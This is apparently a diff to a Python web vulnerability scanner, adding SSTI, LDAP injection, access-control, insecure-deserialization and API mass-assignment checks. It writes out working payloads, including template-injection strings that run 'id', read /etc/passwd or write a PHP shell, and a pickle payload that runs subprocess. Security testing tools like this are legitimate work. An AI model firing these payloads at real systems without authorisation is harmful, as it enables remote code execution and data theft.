+                                   "A Blind XXE payload was sent. Check your collaborator server for interactions.",
+                                   "Disable DTDs and external entity processing.", f"Payload: {payload}", method=method.upper(),
+                                   request_details=request_details, response_details=response_details)
+                return True
+
+        return False
+
+    # Attack Logic
+    potential_endpoints = [u for u in [target] if any(e in u for e in ['/api', '/xml', '/soap', '/rpc'])]
+    potential_endpoints.extend([urljoin(target, path) for path in ["/api/xml", "/xmlrpc", "/soap"]])
+    
+    for endpoint in set(potential_endpoints):
+        if await test_xxe(endpoint, 'POST'):
+            return
+
+    if form_to_test:
+        action_url = urljoin(target, form_to_test['action'])
+        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
+        for input_field in form_to_test['inputs']:
+            if input_field.get('type', 'text') in ['text', 'textarea', 'hidden']:
+                if await test_xxe(action_url, 'POST', input_field['name'], form_data=form_data):
+                    return
+
+    for param_name in ['xml', 'data', 'content']:
+        if await test_xxe(target, 'GET', param_name):
+            return
+    
+    report.add_check(f"XXE Scan on {target}", "No vulnerability found")
+
+async def check_ssti(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+    output.print(f"\n[+] Starting Hybrid Server-Side Template Injection (SSTI) Scan...")
+    
+    ssti_probes = [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "@{7*7}",
+        "{{'7'*7}}", "{{7*'7'}}",
+    ]
+
+    ssti_payloads = [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
+        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}",
+        "{{ config.items() }}",
+        "{{ settings.SECRET_KEY }}",
+        "{{ request.application.__globals__['__builtins__'].open('/etc/passwd').read() }}",
+        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
+        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
+        "#set($x='')...#set($rt=$x.class.forName('java.lang.Runtime'))...#set($cm=$rt.getRuntime().exec('id'))..",
+        "#evaluate($x.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))",
+        "{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id').getInputStream().readAllBytes()|join(' ')}}",
+        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "<%= `id` %>", "<%= File.open('/etc/passwd').read %>",
+        "{Smarty_Internal_Write_File::writeFile('/tmp/shell.php','<?php echo `id`;?>',self::clearConfig())}",
+        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "#{process.mainModule.require('child_process').execSync('id')}",
+        "{{#with 's' as |string|}}{{#with 'e'}}...{{/with}}{{/with}}",
+        "@{System.Diagnostics.Process.Start('cmd.exe','/c id').StandardOutput.ReadToEnd()}",
+        "@(1+1)",
+        "{{'a'.toUpperCase()}}", "${'a'.toUpperCase()}",
+        "{{ some_object.inspect() }}",
+        "{{ [].class.base_classes[0].subclasses() }}",
+        "{{''.class.mro()}}",
+    ]
+
+    async def run_ssti_test(point, payload):
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+        res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        
+        if not res or not await res.text():
+            return False
+
+        response_text = await res.text()
+        
+        if "49" in response_text and "{{7*7}}" not in response_text and "${7*7}" not in response_text:
+            output.print(f"  [CRITICAL] SSTI confirmed via math evaluation on param '{point['param']}' with payload: {payload}")
+            
+            rce_evidence = ""
+            for rce_payload in [p for p in ssti_payloads if "popen('id').read()" in p or "`id`" in p or "exec('id')" in p]:
+                rce_url, rce_data = build_request(point['url'], point['method'], point['param'], point['value'] + rce_payload, point['form_data'], point['original_query'])
+                res_rce, req_rce, resp_rce = await _send_async_http_request(rce_url, method=point['method'], data=rce_data, output=output, session_cookies=session_cookies)
+                if res_rce and await res_rce.text() and "uid=" in await res_rce.text():
+                    output.print(f"    [SUCCESS] SSTI to RCE confirmed! Payload: {rce_payload}")
+                    rce_evidence = f"\n\n--- RCE Post-Exploitation ---\nPayload: {rce_payload}\nResponse Snippet: {(await res_rce.text())[:200]}\n---"
+                    break
+            
+            evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (showing '49') ---\n{response_text[:400]}\n---" + rce_evidence
+            report.add_finding("Server-Side Template Injection (SSTI)", "Critical", test_url, point['param'], payload,
+                               "The application is vulnerable to SSTI, leading to RCE.",
+                               "Do not use user-provided input to construct templates. Use sandboxed template engines.",
+                               evidence, method=point['method'], request_details=request_details, response_details=response_details)
+            return True
+
+        if any(keyword in response_text for keyword in ['SECRET_KEY', 'DATABASE_URL', 'cycler', 'os', 'Runtime', 'passwd']):
+             output.print(f"  [HIGH] Potential SSTI confirmed via sensitive info leak on param '{point['param']}' with payload: {payload}")
+             evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (showing sensitive info) ---\n{response_text[:400]}\n---"
+             report.add_finding("Server-Side Template Injection (Info Leak)", "High", test_url, point['param'], payload,
+                               "The application appears vulnerable to SSTI, reflecting sensitive server-side objects.",
+                               "Do not use user-provided input to construct templates.",
+                               evidence, method=point['method'], request_details=request_details, response_details=response_details)
+             return True
+
+        return False
+
+    attack_points = []
+    parsed_target = urlparse(target)
+    base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
+
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
+        for p_str in params:
+            if '=' in p_str:
+                param_name, value = p_str.split('=', 1)
+                attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+    
+    if form_to_test:
+        action_url = urljoin(target, form_to_test['action'])
+        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
+        for input_field in form_to_test['inputs']:
+            if input_field['type'] not in ['submit', 'hidden']:
+                attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
+    if not attack_points:
+        ssti_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['template', 'view', 'name', 'id', 'data'])]
+        for param_name in ssti_params[:30]:
+            attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': '', 'form_data': None, 'original_query': None})
+
+    for point in attack_points:
+        output.print(f"  [*] Testing SSTI on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        
+        vulnerability_found = False
+        for payload in ssti_probes:
+            if await run_ssti_test(point, payload):
+                vulnerability_found = True
+                break
+        if vulnerability_found: continue
+
+        if ai_enabled:
+            probe_payload = "{{7*7}}"
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+            res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+            response_snippet = (await res.text())[:500] if res and await res.text() else "No response."
+            
+            ai_payloads = await ai_generate_dynamic_payloads("SSTI", probe_payload, response_snippet, output)
+            for payload in ai_payloads:
+                if await run_ssti_test(point, payload):
+                    vulnerability_found = True
+                    break
+            if vulnerability_found: continue
+
+        for payload in ssti_payloads:
+            if await run_ssti_test(point, payload):
+                vulnerability_found = True
+                break
+        
+        if not vulnerability_found:
+            report.add_check(f"SSTI Check on param '{point['param']}' at {point['url']}", "No vulnerability found")
+
+    output.print("  [INFO] SSTI scan completed.")
+
+async def check_ldap_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+    output.print(f"\n[+] Starting Hybrid LDAP Injection Scan...")
+
+    ldap_probes = ["*", ")", "(", ")(", "*)(", "admin*"]
+    
+    ldap_payloads = [
+        "*", "(", ")", "&", "|", "=", ">=", "<=", "~=", ")(", "*)(", "()",
+        "*)(cn=*)", ")(uid=*)", "*))%00", "(|(cn=*)(sn=*))", "(&(cn=*)(sn=*))",
+        "admin*", "*admin", "*admin*",
+        "(objectClass=*)", "(uid=*)", "(cn=*)", "(sn=*)", "(mail=*)", "(telephoneNumber=*)",
+        "a'b", "a''b", "'", "')(", ")(", "\\", "//", "/!", "*\\",
+        "(uid=admin)", "(uid=admin)(uid=*)", "(uid=nonexistentuser)",
+        "(&(objectClass=user)(uid=admin))", "(&(objectClass=user)(uid=nonexistent))",
+    ]
+
+    ldap_errors = [
+        "ldap", "invalid filter", "illegal", "protocol error", "ldap exception",
+        "javax.naming.NameNotFoundException", "object does not exist",
+        "javax.naming.directory.InvalidSearchFilterException", "unrecognized attribute",
+        "ldap_search()", "ldap entry", "search filter is invalid"
+    ]
+
+    async def test_single_ldap_payload(point, payload):
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+        res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+
+        if res and await res.text():
+            response_text = await res.text()
+            if any(e in response_text.lower() for e in ldap_errors):
+                output.print(f"  [HIGH] LDAP Injection confirmed in {point['method'].upper()} param '{point['param']}' with payload: {payload}")
+                evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet ---\n{response_text[:400]}\n---"
+                report.add_finding("LDAP Injection", "High", test_url, point['param'], payload,
+                                   "The application is vulnerable to LDAP Injection, which may allow for authentication bypass or information disclosure.",
+                                   "Use parameterized LDAP queries or properly sanitize user input before including it in LDAP filters.",
+                                   evidence, method=point['method'], request_details=request_details, response_details=response_details)
+                return True
+        return False
+
+    attack_points = []
+    parsed_target = urlparse(target)
+    base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
+
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
+        for p_str in params:
+            if '=' in p_str:
+                param_name, value = p_str.split('=', 1)
+                attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+
+    if form_to_test:
+        action_url = urljoin(target, form_to_test['action'])
+        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
+        for input_field in form_to_test['inputs']:
+            if input_field['type'] not in ['submit', 'hidden']:
+                attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
+    if not attack_points:
+        ldap_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['user', 'uid', 'person', 'search', 'filter', 'query'])]
+        for param_name in ldap_params[:20]:
+            attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': 'test', 'form_data': None, 'original_query': None})
+
+    for point in attack_points:
+        output.print(f"  [*] Testing LDAP Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        
+        vulnerability_found = False
+        for payload in ldap_probes:
+            if await test_single_ldap_payload(point, payload):
+                vulnerability_found = True
+                break
+        if vulnerability_found: continue
+
+        if ai_enabled:
+            probe_payload = "*"
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+            res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+            response_snippet = (await res.text())[:500] if res and await res.text() else "No response."
+            
+            ai_payloads = await ai_generate_dynamic_payloads("LDAP Injection", probe_payload, response_snippet, output)
+            for payload in ai_payloads:
+                if await test_single_ldap_payload(point, payload):
+                    vulnerability_found = True
+                    break
+            if vulnerability_found: continue
+
+        for payload in ldap_payloads:
+            if await test_single_ldap_payload(point, payload):
+                vulnerability_found = True
+                break
+        
+        if not vulnerability_found:
+            report.add_check(f"LDAP Injection Check on param '{point['param']}' at {point['url']}", "No vulnerability found")
+
+    output.print("  [INFO] LDAP Injection scan completed.")
+
+async def check_bac(target, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None):
+    output.print(f"\n[+] Starting Broken Access Control (BAC) / Privilege Escalation Scan...")
+    
+    if not session_cookies:
+        output.print("  [INFO] BAC scan requires an authenticated session. Skipping as no session cookies were provided.")
+        report.add_check("Broken Access Control Scan", "Skipped (No session)")
+        return
+
+    base_url = normalize_target(target)
+    
+    admin_paths = [
+        "/admin", "/dashboard", "/admin/dashboard", "/admin/settings", "/admin/users", "/manage", "/config",
+        "/admin.php", "/admin.html", "/admin/index.php", "/api/admin", "/api/users", "/api/v1/admin",
+        "/system", "/controlpanel", "/cpanel", "/admin/home", "/user/admin", "/admin/panel", "/apanel",
+        "/admin/login", "/admin/auth", "/management", "/webadmin", "/admin/console", "/console",
+        "/admin/manage_users", "/admin/config", "/admin/reports", "/admin/view_logs", "/api/private",
+        "/internal", "/backoffice", "/godmode", "/superuser", "/admin/profile", "/admin/edit",
+    ]
+
+    # Phase 1: Vertical Privilege Escalation (Direct Access)
+    output.print("  [Phase 1] Probing for direct access to common admin paths...")
+    vulnerable_endpoints = set()
+
+    urls_to_test = set(discovered_urls or [])
+    for path in admin_paths:
+        urls_to_test.add(urljoin(base_url, path))
+
+    for url in urls_to_test:
+        if "logout" in url.lower() or "signout" in url.lower():
+            continue
+
+        res, request_details, response_details = await _send_async_http_request(url, output=output, session_cookies=session_cookies)
+        
+        if res and res.status == 200:
+            response_text = await res.text()
+            if any(keyword in response_text.lower() for keyword in ["dashboard", "admin panel", "manage users", "system settings", "control panel"]):
+                if url not in vulnerable_endpoints:
+                    output.print(f"  [HIGH] Potential Vertical Privilege Escalation. Authenticated user can access: {url}")
+                    evidence = f"Accessed admin-like URL '{url}' with a standard user session and received a 200 OK response.\n\nResponse Snippet:\n---\n{response_text[:300]}\n---"
+                    report.add_finding("Broken Access Control - Vertical Privilege Escalation", "High", url, "N/A", "Direct Access",
+                                       "An authenticated user can directly access an administrative endpoint.",
+                                       "Implement strict, deny-by-default access control checks on the server-side for every sensitive endpoint.",
+                                       evidence, method="GET")
+                    vulnerable_endpoints.add(url)
+
+    # Phase 2: Parameter-based Privilege Escalation
+    output.print("  [Phase 2] Probing for parameter-based privilege escalation...")
+    
+    attack_points = []
+    if discovered_urls:
+        for url in discovered_urls:
+            if urlparse(url).query:
+                params = unquote(urlparse(url).query).split('&')
+                for p_str in params:
+                    if '=' in p_str:
+                        param_name, value = p_str.split('=', 1)
+                        attack_points.append({'url': url, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': urlparse(url).query})
+
+    if discovered_forms:
+        for form in discovered_forms:
+            action_url = urljoin(target, form['action'])
+            form_data = {i['name']: i.get('value', 'test') for i in form['inputs']}
+            for input_field in form['inputs']:
+                attack_points.append({'url': action_url, 'method': form['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
+    privilege_params = ['isAdmin', 'is_admin', 'admin', 'role', 'access_level', 'user_type', 'is_superuser']
+    
+    for point in attack_points:
+        if point['param'] in privilege_params:
+            output.print(f"  [*] Testing privilege parameter '{point['param']}' at {point['url']}")
+            
+            res_orig, _, _ = await _send_async_http_request(point['url'], method=point['method'], data=point['form_data'], output=output, session_cookies=session_cookies)
+            if not res_orig: continue
+            
+            for tampered_value in ['true', '1', 'admin', 'administrator', 'superuser']:
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], tampered_value, point['form_data'], point['original_query'])
+                res_tampered, req_details, resp_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+                
+                if res_tampered and res_tampered.status == 200:
+                    if abs(len(await res_orig.text()) - len(await res_tampered.text())) > 100:
+                        output.print(f"  [HIGH] Potential Parameter-Based Privilege Escalation on param '{point['param']}' with value '{tampered_value}'")
+                        evidence = f"Tampering parameter '{point['param']}' with value '{tampered_value}' resulted in a significantly different response."
+                        report.add_finding("Broken Access Control - Parameter-Based Escalation", "High", test_url, point['param'], tampered_value,
+                                           "The application appears to trust user-controllable parameters to determine access rights.",
+                                           "Do not rely on client-side parameters for access control. User roles and permissions should be managed on the server-side.",
+                                           evidence, method=point['method'], request_details=req_details, response_details=resp_details)
+                        break
+
+    output.print("  [INFO] Broken Access Control scan completed.")
+
+async def check_insecure_deserialization(target, output, tech, report, session_cookies=None):
+    output.print("\n[+] Starting Insecure Deserialization Scan...")
+    target_url = normalize_target(target)
+    
+    deserialization_targets = [
+        {'path': '/', 'param': 'data', 'method': 'POST', 'content_type': 'application/x-www-form-urlencoded'},
+        {'path': '/', 'param': 'cookie', 'method': 'GET', 'content_type': 'N/A'},
+        {'path': '/api/deserialize', 'param': 'object', 'method': 'POST', 'content_type': 'application/json'},
+    ]
+
+    java_payload_rce = base64.b64encode(b"ACED0005737200136A6176612E7574696C2E486173684D61700507DA4C071903000246000A6C6F6164466163746F724900097468726573686F6C647870770800000010000000007800").decode()
+    php_payload_rce = "O:1:\"A\":1:{s:4:\"file\";s:10:\"/etc/passwd\";}"
+    python_payload_rce = base64.b64encode(b"csubprocess\ncheck_output\n(S'id'\ntR.").decode()
+
+    if tech.get('backend') == 'Java' or tech.get('server') and 'tomcat' in tech['server'].lower():
+        output.print("  [*] Testing for Java Insecure Deserialization...")
+        for target_info in deserialization_targets:
+            url = urljoin(target_url, target_info['path'])
+            headers = {'Content-Type': target_info['content_type']} if target_info['content_type'] != 'N/A' else {}
+            
+            if target_info['param'] == 'cookie':
+                headers['Cookie'] = f"JSESSIONID={java_payload_rce}"
+                data = None
+            elif target_info['method'] == 'POST':
+                data = {target_info['param']: java_payload_rce}
+            else:
+                continue
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and ("root:x:0:0" in await res.text() or "uid=" in await res.text()):
+                output.print(f"  [CRITICAL] Java Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
+                report.add_finding("Java Insecure Deserialization (RCE)", "Critical", url, target_info['param'], java_payload_rce, "The application is vulnerable to Java insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {java_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
+                return
+
+    if tech.get('backend') == 'PHP' or tech.get('server') and 'apache' in tech['server'].lower() and 'php' in tech.get('x-powered-by', '').lower():
+        output.print("  [*] Testing for PHP Insecure Deserialization...")
+        for target_info in deserialization_targets:
+            url = urljoin(target_url, target_info['path'])
+            headers = {'Content-Type': target_info['content_type']} if target_info['content_type'] != 'N/A' else {}
+            
+            if target_info['param'] == 'cookie':
+                headers['Cookie'] = f"PHPSESSID={php_payload_rce}"
+                data = None
+            elif target_info['method'] == 'POST':
+                data = {target_info['param']: php_payload_rce}
+            else: continue
+
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and "root:x:0:0" in await res.text():
+                output.print(f"  [CRITICAL] PHP Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
+                report.add_finding("PHP Insecure Deserialization (RCE)", "Critical", url, target_info['param'], php_payload_rce, "The application is vulnerable to PHP insecure deserialization, leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {php_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
+                return
+
+    if tech.get('backend') == 'Python' or tech.get('server') and 'python' in tech['server'].lower():
+        output.print("  [*] Testing for Python Insecure Deserialization (pickle)...")
+        for target_info in deserialization_targets:
+            url = urljoin(target_url, target_info['path'])
+            headers = {'Content-Type': target_info['content_type']} if target_info['content_type'] != 'N/A' else {}
+            
+            if target_info['param'] == 'cookie':
+                headers['Cookie'] = f"session={python_payload_rce}"
+                data = None
+            elif target_info['method'] == 'POST':
+                data = {target_info['param']: python_payload_rce}
+            else: continue
+
+            res, request_details, response_details = await _send_async_http_request(url, method=target_info['method'], data=data, headers=headers, output=output, session_cookies=session_cookies)
+            if res and "uid=" in await res.text():
+                output.print(f"  [CRITICAL] Python Insecure Deserialization (RCE) found at {url} via {target_info['param']}")
+                report.add_finding("Python Insecure Deserialization (RCE)", "Critical", url, target_info['param'], python_payload_rce, "The application is vulnerable to Python insecure deserialization (pickle), leading to Remote Code Execution.", "Avoid deserializing untrusted data. Use safe serialization formats or implement strict validation.", f"Vulnerable URL: {url}\nParameter: {target_info['param']}\nPayload: {python_payload_rce}\nResponse snippet: {(await res.text())[:200]}")
+                return
+    
+    output.print("  [INFO] Insecure Deserialization scan completed.")
+
+async def check_api_security(target, output, tech, report, session_cookies=None):
+    output.print(f"\n[+] Starting Advanced API Security Scan...")
+    base_url = normalize_target(target)
+
+    api_schema_paths = [
+        "/swagger.json", "/openapi.json", "/swagger/v1/swagger.json", "/api/swagger.json",
+        "/api/v1/swagger.json", "/api/docs/swagger.json", "/swagger-ui.html", "/api-docs",
+        "/openapi.yaml", "/swagger.yaml", "/api.yaml", "/api/v1/api.yaml",
+        "/?wsdl", "/service.svc?wsdl", "/api/service?wsdl"
+    ]
+
+    sensitive_keywords = [
+        "password", "secret", "apiKey", "api_key", "token", "auth_token", "session",
+        "privateKey", "private_key", "creditCard", "ssn", "social_security_number"
+    ]
+
+    mass_assignment_payloads = {
+        "isAdmin": True, "is_admin": True, "admin": True, "role": "admin",
+        "is_superuser": True, "superuser": True, "access_level": 0,
+        "account_balance": 999999, "isPremium": True, "is_premium": True
+    }
+
+    schema_found = False
+    for path in api_schema_paths:
+        schema_url = urljoin(base_url, path)
+        res, _, _ = await _send_async_http_request(schema_url, output=output, session_cookies=session_cookies)
+
+        if res and res.status == 200:
+            content_type = res.headers.get('Content-Type', '').lower()
+            response_text = await res.text()
+
+            if 'swagger' in response_text.lower() or 'openapi' in response_text.lower() or 'wsdl:definitions' in response_text.lower():
+                output.print(f"  [HIGH] Found potential API schema/documentation at: {schema_url}")
+                schema_found = True
+                report.add_finding(
+                    "API Schema/Documentation Exposed", "Medium", schema_url, "N/A", "N/A",
+                    "Publicly exposed API documentation can provide attackers with a detailed map of the application's API structure.",
+                    "Ensure that API documentation is not exposed in production environments.",
+                    f"Schema URL: {schema_url}\nContent Snippet:\n{response_text[:300]}..."
+                )
+
+                try:
+                    endpoints = re.findall(r'["\'](/[^"\']+)["\']\s*:', response_text)
+                    for endpoint in set(endpoints):
+                        endpoint_url = urljoin(base_url, endpoint)
+                        
+                        output.print(f"    [*] Checking for excessive data exposure on: GET {endpoint_url}")
+                        res_get, _, _ = await _send_async_http_request(endpoint_url, method='GET', output=output, session_cookies=session_cookies)
+                        if res_get and res_get.status == 200:
+                            get_response_text = await res_get.text()
+                            found_leaks = [keyword for keyword in sensitive_keywords if f'"{keyword}"' in get_response_text or f"'{keyword}'" in get_response_text]
+                            if found_leaks:
+                                output.print(f"      [HIGH] Potential sensitive data exposure found at {endpoint_url}. Keywords: {found_leaks}")
+                                report.add_finding(
+                                    "API Excessive Data Exposure", "High", endpoint_url, "Response Body", ", ".join(found_leaks),
+                                    "The API endpoint appears to be returning sensitive data.",
+                                    "Review the serialization logic for this endpoint and remove any sensitive fields.",
+                                    f"Endpoint: {endpoint_url}\nLeaked Keywords: {found_leaks}\nResponse Snippet:\n{get_response_text[:500]}..."
+                                )
+
+                        output.print(f"    [*] Checking for mass assignment on: POST {endpoint_url}")
+                        baseline_data = {"test": "data"}
+                        res_baseline, _, _ = await _send_async_http_request(endpoint_url, method='POST', data=json.dumps(baseline_data), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+                        
+                        malicious_data = baseline_data.copy()
+                        malicious_data.update(mass_assignment_payloads)
+                        
+                        res_mass, req_details, resp_details = await _send_async_http_request(endpoint_url, method='POST', data=json.dumps(malicious_data), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+                        
+                        if res_mass and res_baseline and res_mass.status == res_baseline.status:
+                            if abs(len(await res_mass.text()) - len(await res_baseline.text())) > 50:
+                                output.print(f"      [HIGH] Potential Mass Assignment vulnerability found at {endpoint_url}.")
+                                report.add_finding(
+                                    "API Mass Assignment", "High", endpoint_url, "Request Body", json.dumps(mass_assignment_payloads),
+                                    "The API endpoint appears to process and persist unauthorized fields.",
+                                    "Use a strict allow-list (DTOs) to define which fields are updatable.",
+                                    f"Endpoint: {endpoint_url}\nPayload Sent: {json.dumps(malicious_data)}\nResponse length changed significantly.",
+                                    method="POST", request_details=req_details, response_details=resp_details
+                                )
+
+                except Exception as e:
+                    output.print(f"    [ERROR] Failed to parse or test endpoints from schema {schema_url}: {e}")
+
+    if not schema_found:
+        output.print("  [INFO] No common API schema files found.")
+        report.add_check("Advanced API Security Scan", "No schema found")
+    else:
+        report.add_check("Advanced API Security Scan", "Completed")
+
+    output.print("  [INFO] Advanced API Security scan completed.")
+
 async def ai_generate_dynamic_payloads(vulnerability_type, base_payload, response_snippet, output):
     """
     Generates dynamic payloads using Gemini and/or Claude AI based on the server's response.
@@ -7198,10 +8193,7 @@ if __name__ == '__main__':
 
         if gemini_api_key:
             try:
-                # genai.configure(api_key=gemini_api_key) # Replaced due to AttributeError
-                # Bypass the helper and set the key on the default client directly
-                from google.generativeai import client as genai_client
-                genai_client.get_default_generative_client().api_key = gemini_api_key
+                genai.configure(api_key=gemini_api_key)
                 GEMINI_MODEL = genai.GenerativeModel('gemini-1.5-flash')
                 print("  [INFO] Gemini API configured successfully.")
             except Exception as e:
@@ -7263,16 +8255,20 @@ if __name__ == '__main__':
         
         print("\n  [?] Select Classic Scan Type:")
         print("    1: Full Scan (Comprehensive)")
-        print("    2: Exposed Services Scan (Focus on common service vulnerabilities)")
-        print("    3: XSS Scan")
-        print("    4: SQLi Scan")
-        print("    5: LFI Scan")
-        print("    6: CMDi Scan")
-        print("    7: RCE Scan")
-        print("    8: SSTI Scan")
-        print("    9: BAC Scan (Broken Access Control)")
+        print("  2. Exposed Services Scan (Nmap, etc.)")
+        print("  3. Cross-Site Scripting (XSS)")
+        print("  4. SQL Injection (SQLi)")
+        print("  5. Local/Remote File Inclusion (LFI/RFI)")
+        print("  6. Command Injection (CMDi)")
+        print("  7. Remote Code Execution (RCE)")
+        print("  8. Server-Side Template Injection (SSTI)")
+        print("  9. Insecure Direct Object References (IDOR/BAC)")
+        print("  10. Server-Side Request Forgery (SSRF)")
+        print("  11. XML External Entity (XXE)")
+        print("  12. HTTP Smuggling")
+        print("  13. Brute Force (Login)")
         
-        scan_type_choice = input("  Enter your choice (1-9): ")
+        scan_type_choice = input("  Enter your choice (1-13): ")
         scan_type_map = {
             '1': 'full',
             '2': 'exposed_services',
@@ -7282,7 +8278,11 @@ if __name__ == '__main__':
             '6': 'cmdi',
             '7': 'rce',
             '8': 'ssti',
-            '9': 'bac'
+            '9': 'idor', # Mapped BAC to IDOR
+            '10': 'ssrf',
+            '11': 'xxe',
+            '12': 'http-smuggling',
+            '13': 'brute-force'
         }
         selected_scan_type = scan_type_map.get(scan_type_choice, 'full')
         print(f"  [INFO] Selected Classic Scan Type: {selected_scan_type.upper()}")
